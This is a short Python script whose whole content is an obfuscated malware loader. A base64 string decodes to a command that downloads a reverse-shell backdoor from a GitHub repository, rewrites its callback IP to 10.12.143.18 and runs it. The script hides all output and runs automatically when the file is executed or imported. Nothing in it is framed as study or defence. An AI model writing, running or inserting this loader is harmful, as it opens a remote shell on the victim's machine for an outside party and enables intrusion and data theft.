import base64
import subprocess

def decode_str(encoded_str):
  decoded_bytes = base64.b64decode(encoded_str) # curl on shell script from repository
  decoded_str = decoded_bytes.decode("utf-8")
  return decoded_str

def run():
  encoded_bytes = b'Y3VybCAtTyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWWFvLVdlbi1DaGFuZy9tYWxpY2lvdXNfcHJvZ3JhbS9tYXN0ZXIvcmV2ZXJzZV9zaGVsbC9iYWNrZG9vci5weSAmJiBzZWQgLWkgJ3MvMS4xLjEuMS8xMC4xMi4xNDMuMTgvJyBiYWNrZG9vci5weSAmJiBweXRob24gYmFja2Rvb3IucHk='
  command = decode_str(encoded_bytes) # base64 encode string with curl command to fetch script from repository
  subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

run()